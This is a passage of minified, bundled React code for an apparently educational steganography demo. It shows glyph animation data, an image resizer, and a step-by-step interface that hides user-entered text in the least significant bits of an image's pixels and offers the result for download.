            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    {
      ch: "O",
      size: 46,
      style: "Medium",
      w: 67.3,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [7.956, -27.191],
                      [9.366, -12.186],
                      [23.969, 1.007],
                      [49.146, -1.2080000000000002],
                      [59.821, -16.918999999999997],
                      [59.821, -44.714],
                      [58.411, -59.72],
                      [43.808, -72.913],
                      [18.631, -70.69699999999999],
                      [7.956, -54.986],
                    ],
                    o: [
                      [7.956, -17.723999999999997],
                      [17.423000000000002, -1.7119999999999997],
                      [43.103, 1.007],
                      [58.208999999999996, -11.078],
                      [59.821, -27.191],
                      [59.821, -54.181],
                      [50.354, -70.19399999999999],
                      [24.674, -72.913],
                      [9.568, -60.727],
                      [7.956, -44.714],
                    ],
                    v: [
                      [7.956, -27.191],
                      [12.891, -7.654],
                      [33.939, 1.007],
                      [53.879, -6.445],
                      [59.821, -27.191],
                      [59.821, -44.714],
                      [54.886, -64.252],
                      [33.939, -72.913],
                      [13.898, -65.46],
                      [7.956, -44.714],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "O",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                ind: 1,
                ty: "sh",
                ix: 2,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [49.045, -28.198],
                      [44.513, -7.755],
                      [18.732, -13.797],
                      [18.732, -43.707],
                      [23.264, -64.151],
                      [49.045, -58.108000000000004],
                    ],
                    o: [
                      [49.045, -13.797],
                      [23.264, -7.755],
                      [18.732, -28.198],
                      [18.732, -58.108000000000004],
                      [44.513, -64.151],
                      [49.045, -43.707],
                    ],
                    v: [
                      [49.045, -28.198],
                      [33.939, -7.755],
                      [18.732, -28.198],
                      [18.732, -43.707],
                      [33.939, -64.151],
                      [49.045, -43.707],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "O",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "O",
            np: 5,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    {
      ch: "L",
      size: 46,
      style: "Medium",
      w: 53.8,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [9.668, 0],
                      [53.073, 0],
                      [53.073, -8.862],
                      [20.444, -8.862],
                      [20.444, -71.906],
                      [9.668, -71.906],
                    ],
                    o: [
                      [9.668, 0],
                      [53.073, 0],
                      [53.073, -8.862],
                      [20.444, -8.862],
                      [20.444, -71.906],
                      [9.668, -71.906],
                    ],
                    v: [
                      [9.668, 0],
                      [53.073, 0],
                      [53.073, -8.862],
                      [20.444, -8.862],
                      [20.444, -71.906],
                      [9.668, -71.906],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "L",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "L",
            np: 3,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
  ],
  __complete = !0,
  Binary = {
    v: v$1,
    meta,
    fr,
    ip,
    op,
    w: w$1,
    h,
    nm,
    ddd,
    assets,
    fonts,
    layers,
    markers,
    chars,
    __complete,
  },
  BinaryAnimation = () =>
    jsxRuntimeExports.jsx("div", {
      children: jsxRuntimeExports.jsx(Lottie, {
        style: { height: 80, width: 200 },
        animationData: Binary,
        loop: !0,
      }),
    }),
  WithImageClick = (i) => {
    const a = (s) => {
        const [tt, nt] = reactExports.useState(null),
          ot = useDispatch(),
          {
            completedTask: st,
            selectedImageArr: ft,
            checkedValue: ht,
          } = useSelector((_t) => _t.exp),
          gt = (_t) => {
            nt(_t);
          },
          St = () => {
            nt(null);
          },
          vt = (_t) => {
            ot(updateEditText(!0)),
              ot(updateSelectedImage(_t)),
              ot(updateCompletedTask(st + 1)),
              ot(
                updateSteps(
                  "Enter the text you want to hide inside the text box then Click “Enter”."
                )
              );
          };
        return jsxRuntimeExports.jsx(i, {
          handleMouseEnter: gt,
          handleMouseLeave: St,
          handleClick: vt,
          hoveredId: tt,
          data: ht === 1 ? [1, 2, 3] : ft,
          ...s,
        });
      },
      o = i.displayName || i.name || "Component";
    return (a.displayName = `WithImageClick(${o})`), a;
  },
  ImageComponent = ({
    handleMouseEnter: i,
    handleClick: a,
    handleMouseLeave: o,
    hoveredId: s,
    data: tt,
  }) =>
    jsxRuntimeExports.jsx("div", {
      children: jsxRuntimeExports.jsx("div", {
        style: {
          display: "flex",
          justifyContent: "space-around",
          alignItems: "center",
          marginBlock: 15,
          flex: 1,
        },
        children:
          tt == null
            ? void 0
            : tt.map((nt) =>
                jsxRuntimeExports.jsxs(
                  "div",
                  {
                    style: {
                      display: "flex",
                      flexDirection: "column",
                      justifyContent: "center",
                      alignContent: "center",
                    },
                    children: [
                      jsxRuntimeExports.jsx("div", {
                        style: {
                          width: "150px",
                          height: 150,
                          background: "#0c2136",
                          borderRadius: 30,
                          display: "flex",
                          justifyContent: "center",
                          alignItems: "center",
                          color: "white",
                        },
                        onMouseEnter: () => i(nt),
                        onMouseLeave: o,
                        onClick: () => a(nt),
                        children: jsxRuntimeExports.jsx("img", {
                          alt: `image${nt}`,
                          src: listImages[nt - 1],
                          style: {
                            width: "90%",
                            height: "90%",
                            borderRadius: 20,
                            transform: s === nt ? "scale(1.1)" : "scale(1)",
                          },
                        }),
                      }),
                      jsxRuntimeExports.jsxs("h6", {
                        style: { textAlign: "center", color: "black" },
                        children: ["IMAGE_", nt, ".jpg"],
                      }),
                    ],
                  },
                  nt
                )
              ),
      }),
    }),
  ImageComponent$1 = WithImageClick(ImageComponent);
var build = { exports: {} };
(() => {
  var i = {
      d: (nt, ot) => {
        for (var st in ot)
          i.o(ot, st) &&
            !i.o(nt, st) &&
            Object.defineProperty(nt, st, { enumerable: !0, get: ot[st] });
      },
      o: (nt, ot) => Object.prototype.hasOwnProperty.call(nt, ot),
      r: (nt) => {
        typeof Symbol < "u" &&
          Symbol.toStringTag &&
          Object.defineProperty(nt, Symbol.toStringTag, { value: "Module" }),
          Object.defineProperty(nt, "__esModule", { value: !0 });
      },
    },
    a = {};
  function o(nt, ot) {
    for (var st = 0; st < ot.length; st++) {
      var ft = ot[st];
      (ft.enumerable = ft.enumerable || !1),
        (ft.configurable = !0),
        "value" in ft && (ft.writable = !0),
        Object.defineProperty(nt, ft.key, ft);
    }
  }
  i.r(a), i.d(a, { default: () => tt });
  var s = (function () {
    function nt() {
      (function (ft, ht) {
        if (!(ft instanceof ht))
          throw new TypeError("Cannot call a class as a function");
      })(this, nt);
    }
    var ot, st;
    return (
      (ot = nt),
      (st = [
        {
          key: "changeHeightWidth",
          value: function (ft, ht, gt, St, vt, _t) {
            return (
              gt > St && ((ft = Math.round((ft * St) / gt)), (gt = St)),
              ft > ht && ((gt = Math.round((gt * ht) / ft)), (ft = ht)),
              vt && gt < vt && ((ft = Math.round((ft * vt) / gt)), (gt = vt)),
              _t && ft < _t && ((gt = Math.round((gt * _t) / ft)), (ft = _t)),
              { height: ft, width: gt }
            );
          },
        },
        {
          key: "resizeAndRotateImage",
          value: function (ft, ht, gt, St, vt) {
            var _t =
                arguments.length > 5 && arguments[5] !== void 0
                  ? arguments[5]
                  : "jpeg",
              Et =
                arguments.length > 6 && arguments[6] !== void 0
                  ? arguments[6]
                  : 100,
              Ct =
                arguments.length > 7 && arguments[7] !== void 0
                  ? arguments[7]
                  : 0,
              Pt = Et / 100,
              bt = document.createElement("canvas"),
              xt = ft.width,
              yt = ft.height,
              wt = this.changeHeightWidth(yt, gt, xt, ht, St, vt);
            !Ct || (Ct !== 90 && Ct !== 270)
              ? ((bt.width = wt.width), (bt.height = wt.height))
              : ((bt.width = wt.height), (bt.height = wt.width)),
              (xt = wt.width),
              (yt = wt.height);
            var $t = bt.getContext("2d");
            return (
              ($t.fillStyle = "rgba(0, 0, 0, 0)"),
              $t.fillRect(0, 0, xt, yt),
              $t.imageSmoothingEnabled &&
                $t.imageSmoothingQuality &&
                ($t.imageSmoothingQuality = "high"),
              Ct &&
                ($t.rotate((Ct * Math.PI) / 180),
                Ct === 90
                  ? $t.translate(0, -bt.width)
                  : Ct === 180
                  ? $t.translate(-bt.width, -bt.height)
                  : Ct === 270
                  ? $t.translate(-bt.height, 0)
                  : (Ct !== 0 && Ct !== 360) || $t.translate(0, 0)),
              $t.drawImage(ft, 0, 0, xt, yt),
              bt.toDataURL("image/".concat(_t), Pt)
            );
          },
        },
        {
          key: "b64toByteArrays",
          value: function (ft, ht) {
            for (
              var gt = atob(
                  ft
                    .toString()
                    .replace(/^data:image\/(png|jpeg|jpg|webp);base64,/, "")
                ),
                St = [],
                vt = 0;
              vt < gt.length;
              vt += 512
            ) {
              for (
                var _t = gt.slice(vt, vt + 512),
                  Et = new Array(_t.length),
                  Ct = 0;
                Ct < _t.length;
                Ct++
              )
                Et[Ct] = _t.charCodeAt(Ct);
              var Pt = new Uint8Array(Et);
              St.push(Pt);
            }
            return St;
          },
        },
        {
          key: "b64toBlob",
          value: function (ft, ht) {
            var gt = this.b64toByteArrays(ft, ht);
            return new Blob(gt, { type: ht, lastModified: new Date() });
          },
        },
        {
          key: "b64toFile",
          value: function (ft, ht, gt) {
            var St = this.b64toByteArrays(ft, gt);
            return new File(St, ht, { type: gt, lastModified: new Date() });
          },
        },
        {
          key: "createResizedImage",
          value: function (ft, ht, gt, St, vt, _t, Et) {
            var Ct =
                arguments.length > 7 && arguments[7] !== void 0
                  ? arguments[7]
                  : "base64",
              Pt =
                arguments.length > 8 && arguments[8] !== void 0
                  ? arguments[8]
                  : null,
              bt =
                arguments.length > 9 && arguments[9] !== void 0
                  ? arguments[9]
                  : null,
              xt = new FileReader();
            if (!ft) throw Error("File Not Found!");
            if (ft.type && !ft.type.includes("image"))
              throw Error("File Is NOT Image!");
            xt.readAsDataURL(ft),
              (xt.onload = function () {
                var yt = new Image();
                (yt.src = xt.result),
                  (yt.onload = function () {
                    var wt = nt.resizeAndRotateImage(
                        yt,
                        ht,
                        gt,
                        Pt,
                        bt,
                        St,
                        vt,
                        _t
                      ),
                      $t = "image/".concat(St);
                    switch (Ct) {
                      case "blob":
                        var kt = nt.b64toBlob(wt, $t);
                        Et(kt);
                        break;
                      case "base64":
                        Et(wt);
                        break;
                      case "file":
                        var Rt = ft.name
                            .toString()
                            .replace(/(png|jpeg|jpg|webp)$/i, "")
                            .concat(St.toString()),
                          It = nt.b64toFile(wt, Rt, $t);
                        Et(It);
                        break;
                      default:
                        Et(wt);
                    }
                  });
              }),
              (xt.onerror = function (yt) {
                throw Error(yt);
              });
          },
        },
      ]),
      st && o(ot, st),
      nt
    );
  })();
  const tt = {
    imageFileResizer: function (nt, ot, st, ft, ht, gt, St, vt, _t, Et) {
      return s.createResizedImage(nt, ot, st, ft, ht, gt, St, vt, _t, Et);
    },
  };
  build.exports = a;
})();
var buildExports = build.exports;
const Resizer = getDefaultExportFromCjs(buildExports),
  useImageEncoder = () => {
    const [i, a] = reactExports.useState(null),
      o = async (st, ft) => {
        try {
          console.log("Fetching image as Blob:", st);
          const ht = await s(st);
          console.log("Image Blob fetched successfully:", ht);
          const gt = await tt(ht, ft);
          console.log("Image encoded successfully:", gt), a(gt);
        } catch (ht) {
          console.error("Error encoding image:", ht);
        }
      },
      s = async (st) => {
        try {
          return await (await fetch(st)).blob();
        } catch (ft) {
          throw (console.error("Error fetching image as Blob:", ft), ft);
        }
      },
      tt = (st, ft) =>
        new Promise((ht, gt) => {
          Resizer.imageFileResizer(
            st,
            300,
            300,
            "JPEG",
            100,
            0,
            async (St) => {
              try {
                console.log("Image resized successfully:", St);
                const vt = await nt(St, ft);
                ht(vt);
              } catch (vt) {
                console.error("Error encoding resized image:", vt), gt(vt);
              }
            },
            "base64"
          );
        }),
      nt = (st, ft) =>
        new Promise((ht, gt) => {
          const St = new Image();
          (St.crossOrigin = "anonymous"),
            (St.onload = () => {
              try {
                const vt = document.createElement("canvas"),
                  _t = vt.getContext("2d");
                (vt.width = St.width),
                  (vt.height = St.height),
                  _t.drawImage(St, 0, 0);
                const Et = _t.getImageData(0, 0, vt.width, vt.height),
                  Ct = Et.data,
                  bt = (ft + "$t3g0")
                    .split("")
                    .map(($t) => $t.charCodeAt(0).toString(2).padStart(8, "0"))
                    .join(""),
                  xt = bt.length;
                let yt = 0;
                for (let $t = 0; $t < Ct.length; $t += 4)
                  for (let kt = 0; kt < 3; kt++)
                    if (yt < xt) {
                      const It =
                        Ct[$t + kt].toString(2).padStart(8, "0").slice(0, 7) +
                        bt[yt];
                      (Ct[$t + kt] = parseInt(It, 2)), yt++;
                    }
                _t.putImageData(Et, 0, 0);
                const wt = vt.toDataURL();
                console.log("Encoded image data URL created:", wt), ht(wt);
              } catch (vt) {
                console.error("Error during image encoding process:", vt),
                  gt(vt);
              }
            }),
            (St.onerror = (vt) => {
              console.error("Error loading image:", vt), gt(vt);
            }),
            (St.src = st);
        });
    return {
      downloadImage: () => {
        if (i) {
          const st = document.createElement("a");
          (st.href = i),
            (st.download = "encoded_image.png"),
            document.body.appendChild(st),
            st.click(),
            document.body.removeChild(st);
        } else console.error("Encoded image source is not available.");
      },
      encodeMessage: o,
    };
  },
  ChromeBrowserContainer = () => {
    const {
        openEditText: i,
        selectedImageId: a,
        insertText: o,
        convertedBinary: s,
        completedTask: tt,
        encodingSteps: nt,
      } = useSelector((jt) => jt.exp),
      { downloadImage: ot, encodeMessage: st } = useImageEncoder(),
      [ft, ht] = reactExports.useState(!1),
      [gt, St] = reactExports.useState(!1);
    reactExports.useState(!1);
    const [vt, _t] = reactExports.useState([]),
      [Et, Ct] = reactExports.useState(0),
      [Pt, bt] = reactExports.useState(""),
      [xt, yt] = reactExports.useState(""),
      [wt, $t] = reactExports.useState(null),
      [kt, Rt] = reactExports.useState(null),
      [It, Ot] = reactExports.useState({
        R: ["0", "0", "0", "0", "0", "0", "0", "0"],
        G: ["0", "0", "0", "0", "0", "0", "0", "0"],
        B: ["1", "1", "1", "1", "1", "1", "1", "1"],
        rDroped: !1,
        gDroped: !1,
        bDroped: !1,
      }),
      Nt = useDispatch(),
      zt = (jt) => {
        bt(jt.target.value), Nt(updateTextBinary(""));
      },
      Bt = () => {
        Pt !== ""
          ? (Nt(updateEnterText(Pt)),
            Nt(updateCompletedTask(tt + 1)),
            staticMethods.success("Text entered succesfully"),
            Nt(updateSteps("Click “Next” to proceed to the Encoding process.")))
          : staticMethods.error("Please enter the text");
      },
      Wt = () => {
        const jt = o
          .split("")
          .map((Dt) => Dt.charCodeAt(0).toString(2).padStart(8, "0"))
          .join(" ");
        Nt(updateTextBinary(jt)),
          Nt(updateCompletedTask(tt + 1)),
          Nt(updateSteps("Click “Next” to proceed to the Encoding process."));
      },
      Gt = (jt, Dt, Ut) => {
        $t(jt), yt(Dt), Rt(Ut);
      };
    console.log(tt),
      reactExports.useEffect(() => {
        nt === 0 && (St(!1), ht(!1));
      }, [nt]);
    const Vt = (jt, Dt) => {
        Dt.preventDefault();
        let Ut = [],
          Ht = !1;
        if (
          (jt === "R"
            ? ((Ut = [...It.R]),
              (Ut[7] = wt),
              Ot((Kt) => ({ ...Kt, R: Ut, rDroped: !0 })),
              (Ht = !0))
            : jt === "G"
            ? ((Ut = [...It.G]),
              (Ut[7] = wt),
              Ot((Kt) => ({ ...Kt, G: Ut, gDroped: !0 })),
              (Ht = !0))
            : jt === "B" &&
              ((Ut = [...It.B]),
              (Ut[7] = wt),
              Ot((Kt) => ({ ...Kt, B: Ut, bDroped: !0 })),
              (Ht = !0)),
          Ht)
        ) {
          const Kt = vt
            .split("")
            .filter((qt, Qt) => Qt !== kt)
            .join("");
          _t(Kt), $t(null), yt(""), Rt(null);
        }
        Ct(Et + 1);
      },
      Mt = (jt) => {
        jt.preventDefault();
      };
    reactExports.useEffect(() => {
      s.length > 0 && _t(s);
    }, [s]),
      reactExports.useEffect(() => {
        It.rDroped &&
          It.gDroped &&
          It.bDroped &&
          Ot({
            R: ["0", "0", "0", "0", "0", "0", "0", "0"],
            G: ["0", "0", "0", "0", "0", "0", "0", "0"],
            B: ["1", "1", "1", "1", "1", "1", "1", "1"],
            rDroped: !1,
            gDroped: !1,
            bDroped: !1,
          });
      }, [It.rDroped, It.gDroped, It.bDroped]);
    const Ft = () => {
      ht(!0),
        Nt(updateCompletedTask(tt + 1)),
        Nt(
          updateSteps(
            "You may decide to Encode a text again into a picture or proceed further with the Decoding process."
          )
        );
    };
    reactExports.useEffect(() => {
      let jt;
      return (
        ft &&
          (jt = setTimeout(() => {
            St(!0), Nt(updateSelectedImageArr(a));
          }, 2e3)),
        () => {
          clearTimeout(jt);
        }
      );
    }, [ft]),
      reactExports.useEffect(() => {
        vt.length === 0 && tt === 5
          ? (ht(!0), St(!0), Nt(updateSelectedImageArr(a)))
          : vt.length;
      }, [vt]);
    const Tt = async () => {
        try {
          const jt = listImages[a - 1];
          if ((console.log("Selected Image Path:", jt), !o)) {
            console.error("No text to encode");
            return;
          }
          console.log("Text to Encode:", o),
            await st(jt, o),
            console.log("Image encoded successfully"),
            await ot(),
            console.log("Image download initiated");
        } catch (jt) {
          console.error("Error encoding or downloading image:", jt);
        }
      },
      At = () => {
        Nt(updateEncodingSteps(nt + 1)),
          tt === 3 &&
            Nt(
              updateSteps(
                "Click “Convert Binary” to convert the entered text into binary."
              )
            ),
          tt === 4 &&
            Nt(
              updateSteps(
                "Drag and drop at least 6 bits of the text at the LSB of the image’s pixels. Click “Auto” to automatically fill the rest of the bits from the text into the LSB of the image’s pixels."
              )
            ),
          tt === 5 &&
            Nt(
              updateSteps(
                "You may decide to Encode a text again into a picture or proceed further with the Decoding process."
              )
            );
      },
      Lt = () => {
        Nt(updateEncodingSteps(nt - 1));
      };
    return (
      console.log(nt),
      jsxRuntimeExports.jsxs("div", {
        style: {
          display: "flex",
          flex: 0.6,
          width: "50%",
          flexDirection: "column",
          height: "70%",
          background: "white",
        },
        children: [
          jsxRuntimeExports.jsx("div", {
            style: { background: "#0c2136", height: 50 },
            children: jsxRuntimeExports.jsx("h4", {
              style: { textAlign: "center", color: "white" },
              children: "Encoding",
            }),
          }),
          jsxRuntimeExports.jsx("div", {
            style: {
              background: "white",
              display: "flex",
              height: "100%",
              flex: 0.95,
              flexDirection: "column",
              cursor: "pointer",
            },
            children: i
              ? jsxRuntimeExports.jsxs("div", {
                  style: { display: "flex", flex: 1, justifyContent: "center" },
                  children: [
                    nt === 0 &&
                      jsxRuntimeExports.jsx("div", {
                        style: {
                          flex: 0.5,
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          flexDirection: "column",
                        },
                        children: jsxRuntimeExports.jsxs("div", {
                          style: {
                            flex: 1,
                            height: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "flex-start",
                            flexDirection: "column",
                            marginTop: 10,
                          },
                          children: [
                            jsxRuntimeExports.jsx("h5", {
                              style: { color: "black" },
                              children: "Original image",
                            }),
                            jsxRuntimeExports.jsx("img", {
                              alt: "selected",
                              src: listImages[a - 1],
                              style: {
                                width: "100%",
                                height: "70%",
                                borderRadius: 20,
                              },
                            }),
                            jsxRuntimeExports.jsxs("div", {
                              style: { display: "flex", marginTop: 15 },
                              children: [
                                jsxRuntimeExports.jsx(Input, {
                                  placeholder: "Enter text",
                                  style: { width: 300 },
                                  onChange: zt,
                                }),
                                jsxRuntimeExports.jsx(Button, {
                                  style: {
                                    background: "#0c2136",
                                    color: "white",
                                  },
                                  onClick: Bt,
                                  children: "Enter",
                                }),
                              ],
                            }),
                          ],
                        }),
                      }),
                    nt === 1 &&
                      jsxRuntimeExports.jsx("div", {
                        style: {
                          flex: 1,
                          height: "100%",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "space-between",
                          paddingInline: 10,
                        },
                        children: jsxRuntimeExports.jsx("div", {
                          style: {
                            width: "100%",
                            height: "98%",
                            display: "flex",
                            flexDirection: "column",
                          },
                          children: jsxRuntimeExports.jsxs("div", {
                            style: {
                              background: "#e8e8e8",
                              marginRight: 15,
                              display: "flex",
                              flexDirection: "column",
                              alignItems: "center",
                            },
                            children: [
                              jsxRuntimeExports.jsxs("div", {
                                style: {
                                  display: "flex",
                                  paddingInline: 10,
                                  width: "100%",
                                  flex: 0.3,
                                  flexDirection: "column",
                                },
                                children: [
                                  jsxRuntimeExports.jsxs("div", {
                                    style: {
                                      display: "flex",
                                      paddingInline: 10,
                                      alignItems: "center",
                                      flex: 0.9,
                                    },
                                    children: [
                                      jsxRuntimeExports.jsx("h5", {
                                        style: { color: "black" },
                                        children: "Entered Text :",
                                      }),
                                      jsxRuntimeExports.jsx("h6", {
                                        style: {
                                          paddingLeft: 15,
                                          paddingInline: 5,
                                          color: "red",
                                        },
                                        children: o,
                                      }),
                                    ],
                                  }),
                                  jsxRuntimeExports.jsx(Button, {
                                    style: {
                                      background: "#0c2135",
                                      color: "white",
                                    },
                                    onClick: Wt,
                                    children: "Convert Binary",
                                  }),
                                ],
                              }),
                              s !== "" &&
                                jsxRuntimeExports.jsx("div", {
                                  style: {
                                    display: "flex",
                                    paddingInline: 10,
                                    width: "100%",
                                    flex: 0.3,
                                    flexDirection: "column",
                                  },
                                  children: jsxRuntimeExports.jsxs("div", {
                                    style: {
                                      display: "flex",
                                      paddingInline: 10,
                                      alignItems: "center",
                                      flex: 0.9,
                                    },
                                    children: [
                                      jsxRuntimeExports.jsx("h5", {
                                        style: { color: "black" },
                                        children: "Text Binary :",
                                      }),
                                      jsxRuntimeExports.jsx("textarea", {
                                        style: {
                                          height: 100,
                                          width: 250,
                                          color: "red",
                                          background: "white",
                                        },
                                        value: s,
                                        readOnly: !0,
                                      }),
                                    ],
                                  }),
                                }),
                            ],
                          }),
                        }),
                      }),
                    nt === 2 &&
                      !gt &&
                      s !== "" &&
                      jsxRuntimeExports.jsxs("div", {
                        style: {
                          background: "#e8e8e8",
                          marginTop: 10,
                          marginRight: 15,
                          flex: 1,
                          display: "flex",
                          flexDirection: "column",
                          paddingInline: 5,
                        },
                        children: [
                          jsxRuntimeExports.jsxs("div", {
                            style: { flex: 0.5 },
                            children: [
                              jsxRuntimeExports.jsx("h5", {
                                style: { color: "black" },
                                children: "Drag Binary:",
                              }),
                              jsxRuntimeExports.jsx("div", {
                                style: {
                                  display: "grid",
                                  gridTemplateColumns:
                                    "repeat(auto-fill, minmax(20px, 1fr))",
                                  gridAutoRows: "50px",
                                  gap: "5px",
                                  overflow: "auto",
                                  maxHeight: 300,
                                },
                                children:
                                  vt.length > 0 &&
                                  (vt == null
                                    ? void 0
                                    : vt.split("").map((jt, Dt) => {
                                        const Ut =
                                          Dt === 0
                                            ? "R"
                                            : Dt === 1
                                            ? "G"
                                            : Dt === 2
                                            ? "B"
                                            : null;
                                        return (
                                          jt !== " " &&
                                          jsxRuntimeExports.jsx(
                                            "div",
                                            {
                                              style: {
                                                width: 18,
                                                height: 50,
                                                padding: 5,
                                                marginInline: 1,
                                                background:
                                                  Dt <= 2
                                                    ? "linear-gradient(45deg, #800080, #4b0082, #0000ff)"
                                                    : "grey",
                                                color: "white",
                                                cursor:
                                                  Dt <= 2
                                                    ? "grab"
                                                    : "not-allowed",
                                              },
                                              draggable: Dt <= 2,
                                              onDragStart: () => Gt(jt, Ut, Dt),
                                              children: jsxRuntimeExports.jsx(
                                                "span",
                                                { children: jt }
                                              ),
                                            },
                                            Dt
                                          )
                                        );
                                      })),
                              }),
                            ],
                          }),
                          vt.length > 0 &&
                            jsxRuntimeExports.jsxs("div", {
                              style: { flex: 0.3 },
                              children: [
                                jsxRuntimeExports.jsx("h5", {
                                  style: { color: "black" },
                                  children: "Drop Binary:",
                                }),
                                jsxRuntimeExports.jsxs("div", {
                                  style: {
                                    display: "flex",
                                    background:
                                      "linear-gradient(45deg, #800080, #4b0082, #0000ff)",
                                    flex: 0.5,
                                    color: "white",
                                    height: 30,
                                    alignItems: "center",
                                    marginBottom: 5,
                                  },
                                  children: [
                                    jsxRuntimeExports.jsx("h6", {
                                      style: {
                                        flex: 0.35,
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        borderRigthStyle: "solid",
                                        borderRightWidth: 1,
                                        borderRightColor: "white",
                                      },
                                      children: "R(0)",
                                    }),
                                    jsxRuntimeExports.jsx("h6", {
                                      style: {
                                        flex: 0.35,
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                      },
                                      children: "G(0)",
                                    }),
                                    jsxRuntimeExports.jsx("h6", {
                                      style: {
                                        flex: 0.35,
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                      },
                                      children: "B(255)",
                                    }),
                                  ],
                                }),
                                jsxRuntimeExports.jsx("div", {
                                  style: {
                                    flex: 0.4,
                                    display: "flex",
                                    alignItems: "center",
                                    justifyContent: "space-around",
                                  },
                                  children: jsxRuntimeExports.jsxs("div", {
                                    style: { display: "flex", flex: 1 },
                                    children: [
                                      jsxRuntimeExports.jsx("div", {
                                        style: {
                                          flex: 0.35,
                                          display: "flex",
                                          alignItems: "center",
                                          justifyContent: "center",
                                        },
                                        children: ft
                                          ? jsxRuntimeExports.jsx(
                                              BinaryAnimation,
                                              {}
                                            )
                                          : Array.from(
                                              { length: 8 },
                                              (jt, Dt) => Dt + 1
                                            ).map((jt, Dt) =>
                                              jsxRuntimeExports.jsx(
                                                "div",
                                                {
                                                  style: {
                                                    width: 18,
                                                    height: 50,
                                                    padding: 5,
                                                    marginInline: 1,
                                                    background:
                                                      It.rDroped && Dt === 7
                                                        ? "linear-gradient(45deg, #800080, #4b0082, #0000ff)"
                                                        : "grey",
                                                    color:
                                                      It.rDroped && Dt === 7
                                                        ? "white"
                                                        : "black",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    fontSize: 13,
                                                    fontWeight: 700,
                                                  },
                                                  onDrop: (Ut) => Vt("R", Ut),
                                                  onDragOver: Dt === 7 && Mt,
                                                  children: It.R[Dt],
                                                },
                                                jt
                                              )
                                            ),
                                      }),
                                      jsxRuntimeExports.jsx("div", {
                                        style: {
                                          flex: 0.35,
                                          display: "flex",
                                          alignItems: "center",
                                          justifyContent: "center",
                                        },
                                        children: ft
                                          ? jsxRuntimeExports.jsx(
                                              BinaryAnimation,
                                              {}
                                            )
                                          : Array.from(
                                              { length: 8 },
                                              (jt, Dt) => Dt + 1
                                            ).map((jt, Dt) =>
                                              jsxRuntimeExports.jsx(
                                                "div",
                                                {
                                                  style: {
                                                    width: 18,
                                                    height: 50,
                                                    padding: 5,
                                                    marginInline: 1,
                                                    background:
                                                      It.gDroped && Dt === 7
                                                        ? "linear-gradient(45deg, #800080, #4b0082, #0000ff)"
                                                        : "grey",
                                                    color:
                                                      It.gDroped && Dt === 7
                                                        ? "white"
                                                        : "black",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    fontSize: 13,
                                                    fontWeight: 700,
                                                  },
                                                  onDrop: (Ut) => Vt("G", Ut),
                                                  onDragOver: Dt === 7 && Mt,
                                                  children: It.G[Dt],
                                                },
                                                jt
                                              )
                                            ),
                                      }),
                                      jsxRuntimeExports.jsx("div", {
                                        style: {
                                          flex: 0.35,
                                          display: "flex",
                                          alignItems: "center",
                                          justifyContent: "center",
                                        },
                                        children: ft
                                          ? jsxRuntimeExports.jsx(
                                              BinaryAnimation,
                                              {}
                                            )
                                          : Array.from(
                                              { length: 8 },
                                              (jt, Dt) => Dt + 1
                                            ).map((jt, Dt) =>
                                              jsxRuntimeExports.jsx(
                                                "div",
                                                {
                                                  style: {
                                                    width: 18,
                                                    height: 50,
                                                    padding: 5,
                                                    marginInline: 1,
                                                    background:
                                                      It.bDroped && Dt === 7
                                                        ? "linear-gradient(45deg, #800080, #4b0082, #0000ff)"
                                                        : "grey",
                                                    color:
                                                      It.bDroped && Dt === 7
                                                        ? "white"
                                                        : "black",
